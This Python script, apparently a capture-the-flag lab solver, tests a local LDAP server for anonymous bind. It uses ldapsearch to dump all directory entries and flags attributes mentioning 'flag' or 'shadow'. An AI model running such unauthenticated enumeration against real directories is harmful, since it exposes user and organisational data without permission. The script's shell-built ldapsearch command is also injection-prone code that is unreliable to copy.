import os
import sys
import re

TARGET = "ldap://localhost:389"
BASE_DN = "dc=shadownet,dc=local"

def exploit_ldap():
    print(f"[*] Testing LDAP Anonymous Bind on {TARGET}...")
    # Using ldapsearch CLI tool directly as it's most reliable for quick tests
    try:
        # Check if ldapsearch is installed
        if os.system("command -v ldapsearch > /dev/null") != 0:
            print("[-] Error: 'ldapsearch' command not found on host. Please install it (brew install openldap).")
            return

        print("[*] Querying all records...")
        cmd = f'ldapsearch -x -H {TARGET} -b "{BASE_DN}"'
        output = os.popen(cmd).read()
        
        if "dn: " in output:
            print("[+] Success! Anonymous bind allowed.")
            
            # Split the output by double newlines to separate entries
            entries = output.strip().split("\n\n")
            print(f"[+] Found {len(entries)} entries:")
            
            for entry in entries:
                lines = entry.splitlines()
                dn = ""
                attributes = []
                is_flag = False
                
                for line in lines:
                    if line.lower().startswith("dn: "):
                        dn = line[4:].strip()
                    elif ": " in line:
                        attr, val = line.split(": ", 1)
                        attributes.append((attr, val))
                        if "shadow" in val.lower() or "flag" in val.lower() or "flag" in attr.lower():
                            is_flag = True
                
                prefix = "[!] FLAG FOUND -> " if is_flag else "    - "
                print(f"{prefix}DN: {dn}")
                for attr, val in attributes:
                    if attr.lower() not in ["dn", "objectclass"]:
                        print(f"        {attr}: {val}")
        else:
            print("[-] LDAP query returned no results. Anonymous bind might be disabled or service is down.")
            
    except Exception as e:
        print(f"[-] LDAP test failed: {e}")

if __name__ == "__main__":
    exploit_ldap()
